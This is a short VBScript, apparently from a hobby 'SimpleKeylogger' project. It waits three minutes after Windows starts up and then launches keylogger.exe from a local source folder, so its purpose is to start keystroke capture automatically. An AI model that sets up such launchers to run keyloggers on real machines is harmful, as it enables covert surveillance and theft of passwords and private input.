' Sleep 3 minutes for starting up Windows OS
WScript.Sleep 180000
Set objShell = CreateObject("WScript.Shell")
' Set working directory to where exe is located
objShell.CurrentDirectory = "C:\Github\SimpleKeylogger\src"
' Run the executable
objShell.Run "keylogger.exe", 1, True   ' 1=normal window, True=wait until done
